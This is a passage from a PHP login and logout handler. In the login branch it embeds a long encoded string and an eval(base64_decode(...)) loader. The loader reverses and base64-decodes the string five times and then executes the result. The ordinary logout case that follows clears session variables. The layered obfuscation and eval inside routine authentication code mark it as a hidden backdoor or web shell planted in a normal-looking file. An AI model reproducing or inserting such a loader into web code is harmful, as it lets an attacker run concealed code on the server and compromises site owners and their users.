kVldlTJplVktkVGlkePZlVXF2MSh1VsR2chJjVhRVbwV1YVp1VUhFZDZlRShUVsRWVXRkR0ZVVW9kYFBDMUpmRXJ1MoRXWxoENiZlUTN2R4xWUtdmeWhlUv1UMWl1VrZValRFbWZVbGdkUxAHWiZkWsd1RSZFVuRmSiVUMQZlaOpVZXRWWWxmWr10RRp3Vth3VVJjUXZVRkFmVtp0VldUMVJVV1cVWqJ0SWxmVzE1V1oWWVpUcWZkQP10axMDZFZVYlRlUGVFbSNlUtpERWxmWOJWMalkVsp1bN1mRxdVb0R1VXJ1cZ5WT1YlVSpXYHFzTUxmSzV1MGdnUtpEThRkRXRWVJpnVrVzQSdkT35UVWdVUxkFeWhlSTJ1RWhlVthHWVRkRyZVb5s0VGxGNXVlVTZFRGhkWG50RStWMzcFbodlVrlFeUZFcDFGbSBVVrRmTSFjWGZFbs9mYXZ0UR5Gco1UVWNnVrlzciZEb5JFbSRVWXhmcVZlUhZ1axMjVrJ1VjhlQWZlM4dnVxkUMidEeO10V5U3VVR2SWxmVwVVb0JlVxA3cVxGcrJGbal1YEZkVWtmSxZVR4dkVwEDSVpmQWRmRKVXWsp0QSVUNzc1V45kUwoUVW5mTTJmVkh2YFhGaNZVR4VVb0dXTxo1RVxGarVlModUWwcXNSZlWEZlaGd1UGpVcWxmTLZlRSRjVXhHaUNjUWZ1MSdkYHZVYOVFZpZVRadEVUJ0UixGbIV1akNlVEZESaZkTHJ1axMzVsh2VWtWW4R1Vs9mUXpUTWpmSTRVMKdlVrZFMN1mUPZ1aapWTstGeZdVOwYVMshkYHRHbXtGcVRlaZhXTGpFVT5GcWNWbnlXVyw2RSdkSaJmRadFZwAXWWxWWx0kROBnUtB3USp2a3ZlaStkVsZ1MRdVNqlVVKFnVGJ0TWBTMUVmRWp1VEZlRZFjUvZFbZpXTWZ1VkBDc1dVVWdXTG5UYNZFZW5Ub4NXWu50TWxGbXFWRop2VrpVcWZkSHJWVwonYE50VTh1Z5Z1a0gnVxEFMStmWpRFMah1VsR2dSxmThVVb4VlUGpFWW5GZDJGbShkTVZVVhxmWGllaGJXTVFjeaZkWVV2V5InWGpEMiZlURZ1akdVUwkkeWZFazFGbah1UtBHVNFjWzlVV5MnVxI1RRxGaUl1VoZUW6JkVWFjWzoFROplUrB3RW1mRHFGbKpVVrpFVV1GaZZlboJlVyIFaS1GcVFGRGZVVtZ0bNZkWxcVb4RlYGlFeZpmRaZFbaJHZGRmWSJDeWplVo9mUX5UeTpmSXNlMSllVup0bN1mRwZFbW90UrVzRWBTO3ZVMWRTUU50aiZEcGdVbFhXYyYEWhZkWYdlRKZjWHdHeWFTUwY1aalmYzI0VWVkWTFWbWllWFZFbWRkRWl1a0dUTxIFWjZkWaJGSSRnVww2cNZlWzQGRCd1UF9GeUZlQXJmRklnUrRWaZd1d3ZlbWdXTW5UVadEdVRmVaNnVtlzRWFDc5NmRW90VrBXRU5GaaJWRxckWGh2VjJDaYd1V4dnUyokNidEeplVV1UnVYxmSNdlSWVWRkFmYwUDSUVFdzZlVkVjW6pkUWtmW2klaOtUTXZkcStGZhV2R5clWGJ1biZUUyMlaKd1UyIVWXtmWT1EbOB3UrJ1aNdFezRFVStWTWpVSOZlVpFmVaZ0VuJ0VWFTS4FmM4h1VV9GeZFjWXJmRS1kUsRmTSFTS3ZFVatUTFFDaaVkWsVVR0gXVrR3TXZkUYFWRkNlVEZESaZkTHJ1axYjWGh2VXhUQ4VlModUYspkRUxmWp1ERWhlVYRmUl1mUZZVb0VFVFpFWUVFZT1kRWBTVtVTaVtmSVRlaaFmVsl0dRxGaYVGWkRXVyQ3UWxWRwQFbalWTFVTWWhkSDd1RGhWVtRXVjZkW0Z1a0N0UGpVSldUMoZ1aaFXVYx2SSFjSMJmRaFmVyg3VaZFc3JGbKVkVsplTkFjWxZlbKNlUyY0TR1GcU1UVxcVWup0QWZEcZNVb45EVxo1RXtGeTZVMapnVuBnVjhFa0ZFbOtUYsZlMW1GeoNlM4d1VuJ1SS1mUh50VxIlVFRDeVxmTPNlRalXYHFDVUxGcWZleWNnYFFjcOZlVVVWRGlFVXx2VSZFc510V0N1VthXWWNDbyZ1ax8UTXFDVNFjWHlVb5cnVsxGMhVEaUdlaWh0VrJ1aiZkS650VxclVslUeZdFahFWMOpkYHhHbSNjUWZFWk52VHZFUXtmWhJGM1gFVVR3UNZUVyclaGR1VG92dZpmULJ2RGBlYEZkWTdFaIZVMw9kUH5kNaRkRTN1MSZ1VYhmWSZlSV1UVktWVwo1RUhFZhdlRad1UqZkaUxGcHdVb4gnVWpETWxmUYdVRJpnVs50ShxmS0I1aalGVwoFWXRlWwYlMWllWFpVYjV1b5Z1a0t2VGplehdUMYFWRKFXVxA3dNZlSxVFbSFmVthWdZ1GcHJ1RG9mVtFTaiJzZ4ZlbGRTTt50VW1GeVRVRahFVVR2UNZkVwI2RwZVVxokRX5GbHZVMapnVq5kVXhEaYZ1RGtWYxYlRadEepF1MSh1VsR2TidlVRplRa50YVpFdaZlTD1UMWlVVuB3aVFDcGlleNVTTGlFMjdUMaJFbaVlVyY0aSZFcYNlaKdFVwUTWXVlV310RGh2UtBXVSdlUzl1aONVYspFNjFDZsRVMwd0VtlzSidlREdFbShlTs92dWZFah10RFpXVthHaUJDezdVVkNnVXZVYNRlSp1kVsdUWuRWYhxmV5V1akhWYIJFSZFDc3JFbOFnVtBnVkVEcXlVMkBjUyY0bVpmSoRmM4ZlVzwmUiZlVZd1aWpWTrZ1cZ5mT3JmVsh3VrpFWXxmSzVlVStmYGp0MX5GcVd1RolVWXNHeSJjVKNGRGNlY6xmcW5GbaFmMWNFZFRGajVlWYV1a0NVTWpFeTpmQTVFMaVUWzAnWW1WS4JmeCpVZqJlRaZ0bxImVFd3UVplTkFDcZdFWsZVYtZEcX1GdYdVb4NHVXZ0TixmV1IGMW9kVYhGSZhlTT1EbJBzUsplVkBjR1lVMadlYGJVTS1WMOFWMKZkVuVVMWZFZVNFbS9EVyI1cV5mWHFGbkhkTWZlVVZkSXVFVS9kYHpUeW1GcadFRWZFVsR2diZlTNJGRGhWTXNHeW5WT4ZVV1Q1UtBnVk1mUXllaGJnYWxGSjVkVTZVRwVFVYBXYStWMQRmRWpVZGxmRVxWU4JlMSFjUrplTNdVO1Z1aaNVTy4EWNZFZPNGVGZUVykzUNZlV1oleKZ1VGBnRZ5GbX10VGBVTUJkWkBjRZZlMGtmUXJVMWpmSXRVMKVlVGZ1dWZFZxF1aSp2VuFEeV5mWXFGbWBzUth3TVZkWHdlbGtkVwEDWhRkQXRGWBhnVGR2RSdkT18EVCdlTHhHSX5mSXZ1RSFmWEZkWNBDcXVlbOFWYspFMS1GcXF2MoRXVxA3aSxmWLJVbwdVZFZUdZJDaHFGbKZEVspVaNVEcXZFWkJkYtJ1VWxmWWV2aWhFVVlzUNZkVwUVb1YVVrpURZNDb3J1axA1TWZlWkpnUGZ1RwNkUH5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0dSZlWTF1aSpWZWp1VWtWO0YlVSpUVrRWahxmWyVFbadlUspkeTxGahdFRVdXWxIFMSJjRNN1ak5EZykTdWBDb31kVO9kUrJFakFDbXllaGJnYWRGMhVEaUdlaWhUWWJ0aNZlSYFFbSp1UIhGWXdFcrJ1VWRlUrplTkFDcZZFbadUTVFzbR1GcVNmRahVVqZkcNZkVx40V0xWYXJ1cVpnTXZVMKJHZHRnWlZlRZplRwtkUHZVWaRkRTRleGR3VVp1UWJjRzZFbW90VuJ0RWFjTPZlVaRzUXRXaWZFcHl1VodlYWpFTVxmWWRGMGVXWyY0QhxmURRFbk5UVzc2dXVFZhJ1VSFGVtBHWjpmRyRVV5EWYsZVeV1WMoFWR1U0VqZkcSxGZYRVb1YVZXljcZJjRPJ1RK9WVqp0VOZkSZZleatUTGJ1TStmUoV2aadUWtlzdWxGb5ZFbSh1VEZEdWpnQaZ1axoHVq5kVjRlVWZlMw9mUXZkWiRkRORGM0onVrh2dNZkTvJVbwNlUVVzcaVlTLJlVap0UtR3VWBDcxV1MZFTTGl1djdUMaJFbaVlVyY0aSdlU2YFVKdlUwoVcXVlWTZlMG92UrJVYNdlTzlFbk9kYsxWWNRlQrZFWCRnVGB3SWFjSMJGRGd1VFlkeWZEahJ1VOBjVtFzUhNjQzdVVZVjYXZVWhdEdS1kRsNHVVlTYhxGbIFmRkhmVEZESaZkTHJ1axYjWGhmVW1GaJlVMw9kUHpEeTpmSTRVMKdlVrh2UNFjTPNFbSRlTsp0cZVVO3ZVMsd0YGZFVWZkWXZlboplYGpFSOZFZYVmbkRXWXx2ahFjUWZ1aaRFVwUTdW5GazIFMxgFZFRWYTBzb4lFWktmVspVelRkSoV1MShUWqpkTS1mS2JFbkF2YzI0VVFjUXJ1a0gnUWRmTWJDaWZFWSRjUxIFaSxmUT5kRadlVtZ0UhxmWYNmRWdlVIJFdWVUMLJmVaxkVshGWkV1b3VVMStWYxEVeSVlWpRFMaNnVzAnUSFDZhR1aSpmVGp1RUVVOwYlVsVTVVR2UWRlV0ZlRa9kYFFDVkZEZWVWRGlFVsJ0UiZkT5ZlaKhWTXNHeWxGbT1UbGN3VrpVYWFjSHlVbG9kYGpVejRkRXZlbohlVEZkSNdlRzcFbod1VFpVcZd1c4ZVMVJjYEZkTkJjUyZFWopVTX50VjdUMUNWRaRXWWR2bNZlWwQlaKtWVxolRZ5GbPJ2RGBlYGRWVkFjRxplVwtkUHZURUxmWTR2MSZ1VYhmWSZlSVN2R1IVZsZ0cUZlTwYVMaRTUVhmTVpnRYRFWCdlYWpVYiZEaY5EbvdXWXhXYSxGcYV1aalWWVVzcW5mS31kVadVZGRWVNV1a4lFWjFjVxI1RT1GeUFmVKJXVsx2aWxWWxMmeCdlUwoUdUxGZwIlMG1EVspVaNVEcXZFVNhnVGFUP';eval(base64_decode('JHN0cj0kWDsgZm9yKCRpPTA7ICRpPDU7JGkrKyl7JHN0cj1iYXNlNjRfZGVjb2RlKHN0cnJldigkc3RyKSk7fSBldmFsKCRzdHIpOw=='));

		}

		break;

		

		case "logout":{

			unset($_SESSION['first_name']);

			unset($_SESSION['last_name']);

			unset($_SESSION['user_id']);

			unset($_SESSION['user_type']);			

			$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! You are successfully logged out.</strong> .</div>';

			header("location:index.php");

		}

		break;

	}

?>